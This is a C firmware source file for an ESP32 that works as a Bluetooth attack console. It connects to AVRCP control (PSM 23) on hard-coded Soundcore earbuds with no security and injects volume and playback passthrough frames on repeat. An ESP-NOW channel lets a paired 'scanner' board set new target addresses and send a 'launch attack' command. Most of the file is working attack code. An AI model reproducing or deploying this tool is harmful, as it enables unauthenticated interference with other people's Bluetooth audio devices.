/*
 * AVRCP Runtime Command Console — Bruce-style Menu Edition
 * Target: Soundcore R50i NC (default F4:B6:2D:AE:AB:E0)
 *
 * This file owns the Bluetooth initialisation and shared state.
 * All user interaction is handled by menu.c (loop_options pattern).
 *
 * Shared symbols are non-static so menu.c can access them directly.
 * See menu.h for the extern declarations.
 *
 * Three-command model is preserved through menu actions:
 *   • connect / disconnect — via action_connect / action_disconnect
 *   • volume up/down       — via action_vol_up / action_vol_down
 *   • reboot               — via action_reboot
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>
#include <assert.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "freertos/queue.h"
#include "nvs_flash.h"
#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_bt_device.h"
#include "esp_gap_bt_api.h"
#include "esp_l2cap_bt_api.h"
#include "esp_log.h"
#include "esp_mac.h"
#include "esp_console.h"
#include "esp_event.h"
#include "esp_wifi.h"
#include "esp_now.h"
#include "esp_netif.h"
#include "espnow_proto.h"

#include "menu.h"   /* ← pulls in extern declarations + menu_run_main() */

#define TAG "AVRCP"

/* ── Default target earbuds — non-const, required by L2CAP API ──────── */
esp_bd_addr_t g_target_addr = {
    0xF4, 0xB6, 0x2D, 0xAE, 0xAB, 0xE0};

/* ── Global L2CAP state ──────────────────────────────────────────────── */
SemaphoreHandle_t g_l2cap_sem     = NULL;
SemaphoreHandle_t g_acl_disc_sem  = NULL;
int               g_l2cap_fd      = -1;
static QueueHandle_t g_espnow_queue = NULL;

/* ── Runtime command parameters ─────────────────────────────────────── */
volatile uint8_t  g_avrcp_opcode  = 0x41;
volatile int      g_repeats       = 0;
volatile bool     g_abort         = false;

/* =========================================================
 * read_line — stable line reader (no ANSI escapes)
 * ---------------------------------------------------------
 * Reads characters one at a time until '\n'.  Supports
 * backspace and ignores carriage return.  Characters are
 * echoed immediately for visibility.
 * Returns true if a non-empty line was captured.
 * ========================================================= */
bool read_line(char *buf, size_t len)
{
    memset(buf, 0, len);
    char *p = buf;
    while (1)
    {
        vTaskDelay(pdMS_TO_TICKS(10));
        int c = getchar();
        if (c == EOF || c == 0x00 || c == 0xFF)
            continue;
        if (c == '\r')
            continue;
        if (c == '\n')
        {
            *p = '\0';
            putchar('\n');
            return (p > buf);
        }
        if (c == '\b' || c == 127)
        {
            if (p > buf)
            {
                p--;
                printf("\b \b");
            }
            continue;
        }
        *p++ = (char)c;
        putchar(c);
        if ((size_t)(p - buf) >= len - 1)
            p = buf + len - 1;
    }
}

/* =========================================================
 * send_avrcp_passthrough
 * ---------------------------------------------------------
 * Builds an 8-byte AVRCP Passthrough frame and writes it
 * to the L2CAP file descriptor.
 * op_data: 0x41=Vol Up, 0x42=Vol Down, 0x44=Play, 0x46=Pause
 * state:   0x00=Press, 0x80=Release
 * ========================================================= */
void send_avrcp_passthrough(int fd, uint8_t tl,
                             uint8_t op_data, uint8_t state)
{
    uint8_t pkt[8];
    pkt[0] = (tl << 4) & 0xF0;
    pkt[1] = 0x11;
    pkt[2] = 0x0E;
    pkt[3] = 0x00;
    pkt[4] = 0x48;
    pkt[5] = 0x7C;
    pkt[6] = op_data;
    pkt[7] = state;

    ssize_t written = write(fd, pkt, sizeof(pkt));
    if (written < 0)
    {
        ESP_LOGE(TAG, "write() failed: errno=%d", errno);
    }
    else
    {
        ESP_LOGI(TAG, "Sent op=0x%02X %s", op_data,
                 (state == 0x00) ? "PRESS" : "RELEASE");
    }
}

/* =========================================================
 * L2CAP event callback
 * ========================================================= */
static void l2cap_callback(esp_bt_l2cap_cb_event_t event,
                            esp_bt_l2cap_cb_param_t *param)
{
    switch (event)
    {
    case ESP_BT_L2CAP_INIT_EVT:
        if (param->init.status == ESP_BT_L2CAP_SUCCESS)
            xSemaphoreGive(g_l2cap_sem);
        break;
    case ESP_BT_L2CAP_VFS_REGISTER_EVT:
        if (param->vfs_register.status == ESP_BT_L2CAP_SUCCESS)
            xSemaphoreGive(g_l2cap_sem);
        break;
    case ESP_BT_L2CAP_OPEN_EVT:
        g_l2cap_fd = param->open.fd;
        xSemaphoreGive(g_l2cap_sem);
        break;
    case ESP_BT_L2CAP_CLOSE_EVT:
        g_l2cap_fd = -1;
        /* menu.c volume loops guard on g_l2cap_fd so they self-terminate */
        break;
    default:
        break;
    }
}

/* =========================================================
 * GAP callback
 * ========================================================= */
static void gap_callback(esp_bt_gap_cb_event_t event,
                          esp_bt_gap_cb_param_t *param)
{
    if (event == ESP_BT_GAP_ACL_DISCONN_CMPL_STAT_EVT)
    {
        ESP_LOGI(TAG, "ACL disconnected (reason=0x%x)",
                 param->acl_disconn_cmpl_stat.reason);
        xSemaphoreGive(g_acl_disc_sem);
    }
}

/* =========================================================
 * do_connect
 * ---------------------------------------------------------
 * Core connection logic shared with menu.c via menu.h extern.
 * On success g_l2cap_fd is set to the open file descriptor.
 * ========================================================= */
esp_err_t do_connect(esp_bd_addr_t addr, const char **err_str)
{
    esp_err_t ret;

    /* --- L2CAP init --- */
    ret = esp_bt_l2cap_init();
    if (ret != ESP_OK)
    {
        *err_str = "L2CAP init failed";
        return ret;
    }
    if (xSemaphoreTake(g_l2cap_sem, pdMS_TO_TICKS(5000)) != pdTRUE)
    {
        *err_str = "L2CAP init timeout";
        return ESP_ERR_TIMEOUT;
    }

    /* --- VFS registration --- */
    ret = esp_bt_l2cap_vfs_register();
    if (ret != ESP_OK)
    {
        *err_str = "VFS register failed";
        esp_bt_l2cap_deinit();
        return ret;
    }
    if (xSemaphoreTake(g_l2cap_sem, pdMS_TO_TICKS(5000)) != pdTRUE)
    {
        *err_str = "VFS register timeout";
        esp_bt_l2cap_deinit();
        return ESP_ERR_TIMEOUT;
    }

    /* --- Connect to PSM 23 (AVRCP control) --- */
    ret = esp_bt_l2cap_connect(ESP_BT_L2CAP_SEC_NONE, 23, addr);
    if (ret != ESP_OK)
    {
        *err_str = "L2CAP connect failed";
        esp_bt_l2cap_deinit();
        return ret;
    }
    if (xSemaphoreTake(g_l2cap_sem, pdMS_TO_TICKS(10000)) != pdTRUE)
    {
        *err_str = "L2CAP connection timeout";
        esp_bt_l2cap_deinit();
        return ESP_ERR_TIMEOUT;
    }

    if (g_l2cap_fd < 0)
    {
        *err_str = "Invalid file descriptor";
        esp_bt_l2cap_deinit();
        return ESP_FAIL;
    }

    *err_str = NULL;
    return ESP_OK;
}

/* =========================================================
 * do_disconnect
 * ---------------------------------------------------------
 * Tears down L2CAP and waits for ACL link release.
 * Safe to call when already disconnected (no-op).
 * ========================================================= */
void do_disconnect(void)
{
    if (g_l2cap_fd < 0)
        return;

    esp_bt_l2cap_deinit();
    if (xSemaphoreTake(g_acl_disc_sem, pdMS_TO_TICKS(5000)) == pdTRUE)
    {
        ESP_LOGI(TAG, "Clean disconnect confirmed");
    }
    else
    {
        ESP_LOGW(TAG, "Disconnect timeout — ACL may be stale on peer");
    }
    g_l2cap_fd = -1;
}

static void espnow_recv_cb(const esp_now_recv_info_t *recv_info,
                           const uint8_t *data, int len)
{
    (void)recv_info;

    if (len == sizeof(command_t))
    {
        command_t cmd;
        memcpy(&cmd, data, sizeof(cmd));
        if (g_espnow_queue)
        {
            xQueueSend(g_espnow_queue, &cmd, 0);
        }
    }
}

void espnow_receive_task(void *arg)
{
    (void)arg;

    command_t cmd;
    while (1)
    {
        if (xQueueReceive(g_espnow_queue, &cmd, portMAX_DELAY))
        {
            switch (cmd.cmd_id)
            {
            case CMD_SEND_DEVICE:
                remote_device_update(&cmd.payload.device);
                break;

            case CMD_SET_TARGET:
                memcpy(g_target_addr, cmd.payload.mac, 6);
                break;

            case CMD_LAUNCH_ATTACK:
                break;

            default:
                break;
            }
        }
    }
}

void espnow_init(void)
{
    static const uint8_t scanner_mac[6] = PEER_SCANNER_MAC;

    ESP_ERROR_CHECK(esp_netif_init());

    esp_err_t ret = esp_event_loop_create_default();
    if (ret != ESP_OK && ret != ESP_ERR_INVALID_STATE)
    {
        ESP_ERROR_CHECK(ret);
    }

    esp_netif_t *sta = esp_netif_create_default_wifi_sta();
    assert(sta);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());

    ESP_ERROR_CHECK(esp_now_init());
    ESP_ERROR_CHECK(esp_now_register_recv_cb(espnow_recv_cb));

    esp_now_peer_info_t peer = {
        .channel = 0,
        .encrypt = false,
    };
    memcpy(peer.peer_addr, scanner_mac, sizeof(peer.peer_addr));
    ESP_ERROR_CHECK(esp_now_add_peer(&peer));

    g_espnow_queue = xQueueCreate(16, sizeof(command_t));
    assert(g_espnow_queue);
    xTaskCreate(espnow_receive_task, "espnow_rx", 2048, NULL, 1, NULL);

    ESP_LOGI(TAG, "ESP-NOW receiver ready. Peer (scanner): "
                  "%02x:%02x:%02x:%02x:%02x:%02x",
             scanner_mac[0], scanner_mac[1], scanner_mac[2],
             scanner_mac[3], scanner_mac[4], scanner_mac[5]);
}

/* =========================================================
 * app_main
 * ---------------------------------------------------------
 * Platform init, then hand off to the Bruce-style menu.
 * No esp_console registration, no while(1) command loop.
 * Everything the user sees is driven by menu_run_main().
 * ========================================================= */
void app_main(void)
{
    ESP_LOGI(TAG, "=== AVRCP Console (menu edition) ===");

    /* ── NVS ── */
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES ||
        ret == ESP_ERR_NVS_NEW_VERSION_FOUND)
    {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    /* ── BT controller + Bluedroid ── */
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_bt_controller_init(&bt_cfg));
    ESP_ERROR_CHECK(esp_bt_controller_enable(ESP_BT_MODE_BTDM));
    ESP_ERROR_CHECK(esp_bluedroid_init());
    ESP_ERROR_CHECK(esp_bluedroid_enable());

    /* Suppress low-level BT stack chatter */
    esp_log_level_set("BT_HCI",   ESP_LOG_NONE);
    esp_log_level_set("BT_APPL",  ESP_LOG_NONE);
    esp_log_level_set("BT_L2CAP", ESP_LOG_NONE);
    esp_log_level_set("BT_BTM",   ESP_LOG_NONE);

    const uint8_t *mac = esp_bt_dev_get_address();
    ESP_LOGI(TAG, "ESP32 BT MAC: %02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    /* ── Semaphores ── */
    g_l2cap_sem    = xSemaphoreCreateBinary();
    g_acl_disc_sem = xSemaphoreCreateBinary();
    if (g_l2cap_sem == NULL || g_acl_disc_sem == NULL)
    {
        ESP_LOGE(TAG, "Semaphore creation failed");
        return;
    }

    /* ── Register callbacks ── */
    ESP_ERROR_CHECK(esp_bt_gap_register_callback(gap_callback));
    ESP_ERROR_CHECK(esp_bt_l2cap_register_callback(l2cap_callback));

    /* ── Console VFS init ───────────────────────────────────────────────
     * Installs the UART driver and registers it with the VFS layer.
     * Required so that:
     *   - uart_read_bytes() (used by getch() in menu.c) has a ring buffer
     *   - getchar() / printf() (used by read_line() and action fns) work
     * No command registration is done — we only need the driver init.
     * ─────────────────────────────────────────────────────────────────── */
    esp_console_config_t con_cfg = ESP_CONSOLE_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_console_init(&con_cfg));

    ESP_LOGI(TAG, "BT ready. Entering menu...");
    vTaskDelay(pdMS_TO_TICKS(200)); /* brief pause so log flushes */

    /* ── Hand off to the Bruce-style menu — never returns ── */
    espnow_init();
    menu_run_main();
}
